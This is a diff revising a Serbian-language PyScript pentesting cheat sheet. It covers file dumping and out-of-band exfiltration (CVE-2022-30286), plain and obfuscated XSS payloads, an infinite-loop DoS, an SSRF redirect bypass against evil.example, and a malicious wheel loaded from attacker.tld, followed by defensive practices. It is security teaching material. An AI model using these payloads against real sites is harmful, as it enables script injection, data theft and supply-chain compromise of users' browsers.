@@ -1,16 +1,14 @@
 # Pyscript
 
-{{#include ../../banners/hacktricks-training.md}}
+## PyScript vodič za pentesting
 
-## PyScript vodič za Pentesting
+PyScript je novi framework razvijen za integrisanje Python-a u HTML, tako da se može koristiti zajedno sa HTML-om. U ovom cheat sheet-u pronaći ćete kako da koristite PyScript za potrebe pentestinga.
 
-PyScript je novi framework razvijen za integraciju Python-a u HTML, tako da može da se koristi zajedno sa HTML-om. U ovom cheat sheet-u pronaći ćete kako da koristite PyScript za potrebe penetration testing-a.
+### Dumping / Preuzimanje fajlova iz Emscripten virtuelnog memorijskog sistema:
 
-### Dumping / Preuzimanje fajlova iz Emscripten virtuelnog memorijskog filesystem-a:
-
-`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
+`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
-Code:
+Kod:
 ```html
 <py-script>
 with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
@@ -21,11 +19,11 @@ Rezultat:
 
 ![PyScript Pentesting Guide - Dumping / Retrieving files from the Emscripten virtual memory filesystem: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
 
-### [OOB eksfiltracija podataka iz Emscripten virtuelnog memorijskog sistema datoteka (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
+### [OOB Data Exfiltration Emscripten virtual memory filesystem-a (praćenje konzole)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
 
-`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
+`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
-Kod:
+Code:
 ```html
 <py-script>
 x = "CyberGuy" if x == "CyberGuy": with
@@ -53,7 +51,7 @@ Rezultat:
 
 ### Cross Site Scripting (Obični)
 
-Kod:
+Code:
 ```python
 <py-script>
 print("<img src=x onerror='alert(document.domain)'>")
@@ -61,11 +59,11 @@ print("<img src=x onerror='alert(document.domain)'>")
 ```
 Rezultat:
 
-![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
+![OOB Data Exfiltration Emscripten virtuelnog memorijskog sistema (praćenje konzole) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
 
 ### Cross Site Scripting (Python Obfuscated)
 
-Code:
+Kod:
 ```python
 <py-script>
 sur = "\u0027al";fur = "e";rt = "rt"
@@ -79,7 +77,7 @@ print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 ```
 Rezultat:
 
-![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)
+![Cross Site Scripting (Obični) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)
 
 ### Cross Site Scripting (JavaScript Obfuscation)
 
@@ -153,9 +151,9 @@ return _0x599c()
 ```
 Rezultat:
 
-![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS napad (beskonačna petlja)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
+![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Beskonačna petlja)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
 
-### DoS napad (beskonačna petlja)
+### DoS attack (Beskonačna petlja)
 
 Kod:
 ```html
@@ -174,34 +172,39 @@ Rezultat:
 
 ### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)
 
-`urllib3 < 2.5.0` ignoriše parametre `redirect` i `retries` kada se izvršava **unutar Pyodide runtime-a** koji dolazi sa PyScript-om. Kada napadač može da utiče na ciljne URL-ove, može primorati Python kod da prati preusmeravanja između domena čak i kada ih je developer izričito onemogućio - čime se efektivno zaobilazi anti-SSRF logika.<sup>[[1]](#references)</sup>
+`urllib3 >= 2.2.0, < 2.5.0` ignoriše parametre zahteva `redirect` i `retries` kada se koristi sa Pyodide browser transportom. Ako napadač može da utiče na ciljne URL-ove, kod može pratiti cross-domain redirects čak i kada se od urllib3 zahteva da ih onemogući, čime se potkopavaju SSRF odbrane.<sup>[[1]](#references)[[4]](#references)</sup>
 ```html
 <script type="py">
 import urllib3
-http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
-r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
+http = urllib3.PoolManager()
+r = http.request(
+"GET",
+"https://evil.example/302",
+retries=False,
+redirect=False,
+)  # ignored by affected Pyodide/browser runtimes
 print(r.status, r.url)
 </script>
 ```
-Zakrpano u `urllib3 2.5.0` – nadogradite paket u svojoj PyScript slici ili navedite bezbednu verziju u `packages = ["urllib3>=2.5.0"]`. Pogledajte zvanični CVE unos za detalje.
+Nadogradite na `urllib3 >= 2.5.0` za Node.js, ali nemojte se oslanjati na urllib3 za onemogućavanje redirects u browserima; validirajte destinacije ili koristite allow-list pre slanja requests.<sup>[[4]](#references)</sup>
 
-### Učitavanje proizvoljnih paketa i napadi na lanac snabdevanja
+### Učitavanje proizvoljnih paketa i supply-chain napadi
 
-Pošto PyScript dozvoljava proizvoljne URL-ove na listi `packages`, zlonamerni akter koji može da izmeni ili ubaci konfiguraciju može da izvrši **potpuno proizvoljni Python** u pregledaču žrtve:
+PyScript-ova Pyodide konfiguracija prihvata proizvoljne URL-ove wheel paketa u `packages`; ako napadač može da izmeni ili ubaci tu konfiguraciju, naknadni import može izvršiti Python kôd pod kontrolom napadača u browseru žrtve.<sup>[[5]](#references)[[6]](#references)</sup>
 ```html
 <py-config>
 packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
 </py-config>
 <script type="py">
-import payload  # executes attacker-controlled code during installation
+import payload  # executes attacker-controlled code at import
 </script>
 ```
-*Potrebni su samo pure-Python wheels – korak kompilacije WebAssembly nije potreban.* Uverite se da konfiguraciju ne kontroliše korisnik i hostujte pouzdane wheels na sopstvenom domenu uz HTTPS i SRI hashes.
+Pyodide može da instalira pure-Python wheels sa proizvoljnih URL-ova bez WebAssembly build-a paketa.<sup>[[6]](#references)</sup> Ovu konfiguraciju treba da kontroliše developer, dozvolite samo tačne nazive paketa ili URL-ove i proverite digest-e udaljenih wheel-ova tokom build-a ili deployment-a.
 
-### Promene u sanitizaciji izlaza (2023+)
+### Promene sanitizacije izlaza (2023+)
 
-* `print()` i dalje ubacuje sirov HTML i zato je podložan XSS-u (primeri iznad).
-* Noviji pomoćni alat `display()` podrazumevano escape-uje HTML – sirovi markup mora biti obuhvaćen sa `pyscript.HTML()`.
+* U implementaciji 2022.05.1 koja se koristi u legacy primerima, `print()` ispisuje `text/plain` izlaz bez HTML escaping-a i zato je podložan XSS-u.<sup>[[8]](#references)</sup>
+* Trenutni `display()` helper **podrazumevano escape-uje HTML** za obične stringove; raw markup mora biti umotan u `pyscript.HTML()`.<sup>[[2]](#references)</sup>
 ```python
 from pyscript import display, HTML
 
@@ -209,22 +212,26 @@ display("<b>escaped</b>")          # renders literally
 
 display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
 ```
-Ovo ponašanje je uvedeno 2023. godine i dokumentovano je u zvaničnom vodiču Built-ins. Za nepouzdan unos koristite `display()` i izbegavajte direktno pozivanje `print()`.<sup>[[2]](#references)</sup>
+Koristite `display()` za nepouzdani ulaz i ne prosleđujte nepouzdane stringove funkciji `HTML()`.<sup>[[2]](#references)</sup>
 
 ---
 
 ## Najbolje prakse za odbranu
 
-* **Održavajte pakete ažurnim** – nadogradite na `urllib3 >= 2.5.0` i redovno ponovo izgrađujte wheels koji se isporučuju sa sajtom.
-* **Ograničite izvore paketa** – referencirajte samo PyPI nazive ili URL-ove sa istog porekla, idealno zaštićene pomoću Sub-resource Integrity (SRI).
-* **Ojačajte Content Security Policy** – onemogućite ugrađeni JavaScript (`script-src 'self' 'sha256-…'`) kako ubačeni `<script>` blokovi ne bi mogli da se izvrše.
-* **Onemogućite korisnički dostavljene `<py-script>` / `<script type="py">` tagove** – sanitizujte HTML na serveru pre nego što ga prosledite drugim korisnicima.
-* **Izolujte workere** – ako vam nije potreban sinhroni pristup DOM-u iz workera, omogućite zastavicu `sync_main_only` da biste izbegli zahteve za zaglavlja `SharedArrayBuffer`.
+* **Održavajte pakete ažurnim** – koristite `urllib3 >= 2.5.0` u Node.js-u i zasebno proverite pretpostavke pregledača u vezi sa redirekcijama.<sup>[[4]](#references)</sup>
+* **Ograničite izvore paketa** – dozvolite samo odobrena PyPI imena ili tačne pouzdane URL-ove i proverite digeste udaljenih wheel datoteka tokom izgradnje ili deploymenta.<sup>[[5]](#references)[[6]](#references)</sup>
+* **Ojačajte Content Security Policy** – zabranite umetnuti JavaScript (`script-src 'self' 'sha256-…'`) kako ubrizgani blokovi `<script>` ne bi mogli da se izvrše.
+* **Zabranite korisnički unete oznake `<py-script>` / `<script type="py">`** – izvršite sanitizaciju HTML-a na serveru pre nego što ga prosledite drugim korisnicima.
+* **Izolujte workere** – ako vam nije potreban sinhroni pristup DOM-u iz workera, omogućite zastavicu `sync_main_only` da biste izbegli `SharedArrayBuffer` i povezane zahteve za CORS zaglavljima.<sup>[[5]](#references)</sup>
 
-## Reference
+## References
 
 - [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
-- [2] [PyScript dokumentacija za Built-ins – `display` i `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
-- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
-
+- [2] [Dokumentacija ugrađenih funkcija PyScript-a – `display` i `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
+- [3] [Cyber Guy - Umetnost ulančavanja ranjivosti (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
+- [4] [Bezbednosno upozorenje za urllib3 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
+- [5] [Dokumentacija konfiguracije PyScript-a – paketi i `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
+- [6] [Pyodide – Učitavanje paketa](https://pyodide.org/en/stable/usage/loading-packages.html)
+- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
+- [8] [Implementacija `pyscript.py` za PyScript 2022.05.1](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
 {{#include ../../banners/hacktricks-training.md}}
